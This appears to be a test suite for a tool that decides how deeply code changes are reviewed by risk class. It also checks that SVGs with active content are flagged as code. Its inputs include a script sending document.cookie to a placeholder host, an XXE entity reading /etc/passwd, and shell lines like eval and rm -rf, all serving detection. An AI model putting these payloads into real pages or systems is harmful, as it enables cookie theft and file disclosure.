/**
 * R51: review scales to risk, not size (docs/review-policy.md#review-depth, #risk-classes). The risk classes
 * (lib/review-risk.ts), the UI-text rule (lib/review-depth.ts uiTextOnly), and the routing table: every gate,
 * security, user-data and money fixture still plans the full panel, and non-risky code is light at any size.
 */
import { describe, expect, test } from 'bun:test';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { classifyDiff, planReview, scanNumbers, uiTextOnly, type PlanInput } from '../lib/review-depth';
import { matchRisk, RISK_RULES } from '../lib/review-risk';
import { targetedClasses } from '../lib/review-targeted';
import { parseReviewLoop, receiptSummaryLine } from '../lib/ship-receipt';

const ROOT = path.join(import.meta.dir, '..');
const risk = (codePaths: string[], added: Record<string, string[]> = {}, scopeAuth = false) => [...matchRisk({ codePaths, added, removed: {}, scopeAuth }).keys()];

describe('risk classes', () => {
  // Value: protects=security and user-data code reaches the full panel; fails_when=a trust-boundary or data-loss signal is missed,
  //   or an unrelated path or line raises a class; seam=matchRisk
  test('security and data: paths and lines, each with a negative', () => {
    expect(risk(['src/core/trust/owner-actions.ts'])).toEqual(['security']);
    expect(risk(['lib/redact-patterns.ts'])).toEqual(['security']);
    expect(risk(['src/run.ts'], { 'src/run.ts': ['const child = spawn(cmd, { shell: true });'] })).toEqual(['security']);
    expect(risk(['src/view.tsx'], { 'src/view.tsx': ['<div dangerouslySetInnerHTML={{ __html: body }} />'] })).toEqual(['security']);
    expect(risk(['bin/x.sh'], { 'bin/x.sh': ['eval "$CMD"'] })).toEqual(['security']);
    expect(risk(['src/run.ts'], { 'src/run.ts': ['const m = re.exec(line);', 'const s = trustee.name;'] })).toEqual([]);
    expect(risk(['src/core/persistence/git-door.ts'])).toEqual(['data']);
    expect(risk(['src/db/users.ts'], { 'src/db/users.ts': ['await sql`DELETE FROM users WHERE id = ${id}`;'] })).toEqual(['data']);
    expect(risk(['app/models/user.rb'], { 'app/models/user.rb': ['User.where(stale: true).destroy_all'] })).toEqual(['data']);
    expect(risk(['src/list.ts'], { 'src/list.ts': ['// delete from the list when done', 'arr.splice(i, 1);'] })).toEqual([]);
    for (const line of ["const r = spawn('sh', ['-c', cmd], { timeout: 1 });", "Bun.spawn(['bash', '-lc', x]);", "fs.rmSync(t, { recursive: true, force: true });", 'rm -rf "$DIR"'])
      expect(risk(['src/run.ts'], { 'src/run.ts': [line] })).toEqual(['security']);
    expect(risk(['scripts/test-pr-profile.ts', 'lib/storyboard.ts'])).toEqual([]);
    expect(RISK_RULES).toMatch(/^[0-9a-f]{16}$/);
  });
  // Value: protects=the targeted pass keeps its exact classes now that its matchers live in lib/review-risk.ts; fails_when=the move
  //   changes a money, auth or secret verdict; seam=targetedClasses over matchRisk
  test('money, auth and secret come from the same matchers the targeted pass reads', () => {
    const lines = { 'src/run.ts': ['const spend_cap_usd = 5;', 'const k = process.env.OPENAI_API_KEY;'] };
    expect(risk(['src/run.ts', 'src/auth/session.ts'], lines, true)).toEqual(['money', 'auth', 'secret']);
    expect(targetedClasses({ paths: ['src/run.ts', 'src/auth/session.ts'], added: lines, removed: {}, scope: { SCOPE_AUTH: 'true' }, gateTagged: 0 }).classes).toEqual(['money', 'auth', 'secret']);
  });
});

describe('UI or game text is docs (uiTextOnly)', () => {
  // Value: protects=a copy edit in UI code or a locale file plans light with no code reader; fails_when=a logic change passes as text;
  //   seam=uiTextOnly and classifyDiff
  test('text-only pairs pass', () => {
    expect(uiTextOnly('src/App.tsx', ['  <h1>Welcome back</h1>'], ['  <h1>Good to see you again</h1>'])).toBe(true);
    expect(uiTextOnly('src/Login.tsx', ['<input placeholder="Email" />'], ['<input placeholder="Work email" />'])).toBe(true);
    expect(uiTextOnly('locales/en.json', ['  "save": "Save",'], ['  "save": "Save changes",'])).toBe(true);
    expect(uiTextOnly('game/dialogue/intro.yml', ['greeting: "Halt, traveler!"'], ['greeting: "Stop right there, traveler!"'])).toBe(true);
    expect(uiTextOnly('po/fr.po', ['msgstr "Bonjour"'], ['msgstr "Salut"'])).toBe(true);
  });
  test('logic, keys, placeholders, scripts and non-UI files never pass', () => {
    expect(uiTextOnly('src/App.tsx', ['<button onClick={save}>Save</button>'], ['<button onClick={remove}>Save</button>'])).toBe(false);
    expect(uiTextOnly('src/App.tsx', ['  role = "admin";'], ['  role = "user";'])).toBe(false);
    expect(uiTextOnly('src/App.tsx', ['<p>{count} items</p>'], ['<p>{total} items</p>'])).toBe(false);
    expect(uiTextOnly('src/App.vue', ['<script>if (a <b> c) go()</script>'], ['<script>if (a <b> d) go()</script>'])).toBe(false);
    expect(uiTextOnly('src/App.html', ['<span>{{ name }}</span>'], ['<span>{{ user }}</span>'])).toBe(false);
    expect(uiTextOnly('locales/en.json', ['  "save": "Save",'], ['  "store": "Save",'])).toBe(false);
    expect(uiTextOnly('locales/en.json', ['  "hi": "Hi {name}",'], ['  "hi": "Hello",'])).toBe(false);
    expect(uiTextOnly('locales/en.json', [], ['  "new": "New",'])).toBe(false);
    expect(uiTextOnly('src/errors.ts', ['throw new Error("bad input");'], ['throw new Error("invalid input");'])).toBe(false);
    expect(uiTextOnly('src/App.tsx', ['  <h1>Hi</h1>'], ['  <h1>Hi</h1>  '])).toBe(false);
    expect(uiTextOnly('src/App.tsx', ["  const html = '<p>' + safeName + '</p>';"], ["  const html = '<p>' + rawName + '</p>';"])).toBe(false);
    expect(uiTextOnly('src/App.vue', ['  el.innerHTML = `<b>hi</b>`;'], ['  el.innerHTML = `<b>bye</b>`;'])).toBe(false);
    expect(uiTextOnly('src/i18n/loader.ts', ['  endpoint: "https://a.example",'], ['  endpoint: "https://b.example",'])).toBe(false);
  });
  test('classifyDiff counts a text-only UI path as docs only when it has the lines', () => {
    const i = { paths: ['src/App.tsx'], scope: {}, gateTagged: 0, perPath: [{ path: 'src/App.tsx', lines: 2, binary: false }] };
    const text = { added: { 'src/App.tsx': ['<h1>New copy</h1>'] }, removed: { 'src/App.tsx': ['<h1>Old copy</h1>'] } };
    expect(classifyDiff({ ...i, ...text })).toMatchObject({ class: 'docs', runtimeLines: 0 });
    expect(classifyDiff(i)).toMatchObject({ class: 'code', runtimeLines: 2 });
  });
});

const none = scanNumbers({});
const plan = (o: Partial<PlanInput>) => planReview({ paths: ['src/app.ts'], scope: { SCOPE_STATE_MACHINE: 'false' }, gateTagged: 0, diffLines: 10, numbers: none, history: { fullPasses: 0, last: 'none' }, ...o });
const roles = (p: ReturnType<typeof planReview>) => [...new Set(p.dispatches.map(d => d.role))];
const FULL_PANEL = ['specialist', 'red-team', 'adversarial-native', 'outside-voice'];
const captured = (name: string): Partial<PlanInput> => {
  const x = JSON.parse(fs.readFileSync(path.join(ROOT, 'test/fixtures/review-depth', name + '.json'), 'utf8'));
  return { paths: x.paths, deleted: x.deleted, stampOnly: x.stamp_only ?? [], scope: x.scope, gateTagged: x.gate_tagged, diffLines: x.diff_lines, numbers: x.numbers, perPath: x.per_path };
};
const one = (p: string, lines: string[] = ['export const a = 1;']) => ({ paths: [p], added: { [p]: lines }, removed: {}, perPath: [{ path: p, lines: lines.length, binary: false }] });

describe('routing: every gate, security, user-data and money fixture plans the full panel', () => {
  // Value: protects=R51 never lowers review on risky code; fails_when=a gate or risk fixture plans less than outside voice, Red Team,
  //   batched specialist and the native adversarial pass, or loses the targeted reader it had; seam=planReview
  test.each([
    ['captured gate fixture', captured('code'), []],
    ['gate path', one('.github/workflows/ci.yml', ['on: push']), []],
    ['gate tag', { ...one('src/a.ts'), gateTagged: 2 }, ['gate']],
    ['deleted test', { ...one('src/a.ts'), deleted: ['test/a.test.ts'] }, []],
    ['auth scope', { ...one('src/auth/session.ts'), scope: { SCOPE_AUTH: 'true' } }, ['auth']],
    ['migration scope', { ...one('db/migrate/001.sql', ['ALTER TABLE users ADD COLUMN email text;']), scope: { SCOPE_MIGRATIONS: 'true' } }, []],
    ['secret path', one('lib/credentials.ts'), ['secret']],
    ['secret line', one('src/client.ts', ['const k = process.env.OPENAI_API_KEY;']), ['secret']],
    ['money path', one('src/billing/invoice.ts'), ['money']],
    ['money line', one('src/charge.ts', ['export const spend_cap_usd = 5;']), ['money']],
    ['security path', one('lib/redact-patterns.ts'), []],
    ['security line', one('src/run.ts', ['const run = new Function(body);']), []],
    ['user-data path', one('src/core/persistence/store.ts'), []],
    ['user-data line', one('src/db/purge.ts', ['await db.users.deleteMany({ where: { stale: true } });']), []],
  ] as const)('%s', (_n, o, targeted) => {
    const p = plan({ ...(o as Partial<PlanInput>), targeted: { classes: [...targeted] } });
    expect(p.depth).toBe('full');
    expect(FULL_PANEL.filter(r => !roles(p).includes(r as never))).toEqual([]);
    expect(roles(p).includes('targeted')).toBe(targeted.length > 0);
  });
  test('non-risky code is light at any size: one batched reader with the Red Team prompt and the native adversarial', () => {
    const p = plan({ ...one('src/util.ts', Array.from({ length: 900 }, (_, n) => `export const v${n} = ${n};`)), diffLines: 900 });
    expect([p.depth, roles(p)]).toEqual(['light', ['specialist', 'adversarial-native']]);
    const docs = plan({ paths: ['docs/evals/run.md'], perPath: [{ path: 'docs/evals/run.md', lines: 400, binary: false }], numbers: scanNumbers({ 'docs/evals/run.md': ['recall 33/41'] }) });
    expect([docs.depth, roles(docs)]).toEqual(['light', ['outside-voice']]);
  });
});

describe('a research write-up with a chart SVG (R51, gstack-evals#113)', () => {
  // Value: protects=a write-up with one chart gets one reader, and a malicious SVG never rides the docs path; fails_when=a clean
  //   chart plans the code reviewers, an active or external SVG plans as docs, or the specialist reads only the SVG; seam=planReview
  const md = 'docs/evals/run.md';
  const chart = ['<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 50">', '<defs><linearGradient id="g"/></defs>', '<rect width="40" height="30" fill="url(#g)"/>', '<use href="#bar"/><text x="2" y="48">recall 33/41</text>', '</svg>'];
  const writeUp = (svg: string[]) => ({ paths: [md, 'docs/evals/chart.svg'], created: [md, 'docs/evals/chart.svg'], added: { [md]: ['recall 33/41'], 'docs/evals/chart.svg': svg }, removed: {},
    perPath: [{ path: md, lines: 1, binary: false }, { path: 'docs/evals/chart.svg', lines: svg.length, binary: false }], numbers: scanNumbers({ [md]: ['recall 33/41'] }) });
  test('a clean chart SVG goes light with one reader', () => {
    const p = plan(writeUp(chart));
    expect([p.depth, p.class, roles(p)]).toEqual(['light', 'docs', ['outside-voice']]);
  });
  test.each([
    ['a script', '<script>fetch("https://x.example/" + document.cookie)</script>'],
    ['an on-handler', '<svg onload="alert(1)">'],
    ['an on-handler on its own line', 'onclick="go()"'],
    ['an external href', '<image href="https://x.example/a.png"/>'],
    ['an external xlink:href', '<a xlink:href="http://x.example">'],
    ['a javascript: link', '<a href="javascript:alert(1)">'],
    ['a foreignObject', '<foreignObject><div/></foreignObject>'],
    ['a remote @import', '<style>@import url(https://x.example/a.css);</style>'],
    ['a remote url()', '<rect fill="url(https://x.example/p.svg#a)"/>'],
    ['an entity', '<!ENTITY x SYSTEM "file:///etc/passwd">'],
    ['an animated href', '<set attributeName="href" to="#b"/>'],
  ])('an SVG with %s stays code', (_n, line) => {
    expect(plan(writeUp([...chart.slice(0, -1), line, '</svg>'])).class).toBe('code');
  });
  test('an attribute split across lines still keeps the SVG code', () => {
    expect(plan(writeUp(['<svg>', '<rect onclick', '="f()"/>', '</svg>'])).class).toBe('code');
    expect(plan(writeUp(['<svg>', '<image href', '="https://e.example/a.png"/>', '</svg>'])).class).toBe('code');
    expect(plan(writeUp(['<svg>', '<use href', '="#a"/>', '</svg>'])).class).toBe('docs');
  });
  test('an edited SVG stays code: a changed line may sit inside an existing script block', () => {
    expect(plan({ ...writeUp(['  draw(next);']), created: [md] }).class).toBe('code');
  });
  test('the batched specialist on a write-up reads its text files, not only the SVG', () => {
    const p = plan(writeUp([...chart.slice(0, -1), '<svg onload="alert(1)">', '</svg>']));
    const batched = p.dispatches.find(d => d.role === 'specialist')!;
    expect(batched.exclude.some(e => e.endsWith(md))).toBe(false);
    const noNumbers = plan({ ...writeUp([...chart.slice(0, -1), '<svg onload="alert(1)">', '</svg>']), numbers: none });
    expect(noNumbers.dispatches.find(d => d.role === 'specialist')!.exclude.some(e => e.endsWith(md))).toBe(true);
  });
});

describe('the receipt records the tier and the rounds', () => {
  // Value: protects=a receipt carries review_loop.rounds and the summary line prints depth and rounds; fails_when=the parser drops
  //   rounds or a legacy loop without it gains one; seam=parseReviewLoop and receiptSummaryLine
  test('rounds parse and print; a legacy loop prints no rounds', () => {
    expect(parseReviewLoop({ passes: 1, blocking_found: 0, deferred: 0, fix_checks: 1, rounds: 2 })).toMatchObject({ rounds: 2 });
    const r = { pr: 7, head: 'a'.repeat(40), base: 'main', review_depth: { depth: 'light' }, review_loop: { passes: 1, blocking_found: 0, deferred: 0, fix_checks: 1, rounds: 2 } } as never;
    expect(receiptSummaryLine(r)).toContain('depth=light passes=1 blocking_found=0 deferred=0 fix_checks=1 rounds=2');
    const legacy = { pr: 7, head: 'a'.repeat(40), base: 'main', review_loop: { passes: 2, blocking_found: 1, deferred: 0 } } as never;
    expect(receiptSummaryLine(legacy)).not.toContain('rounds=');
  });
});
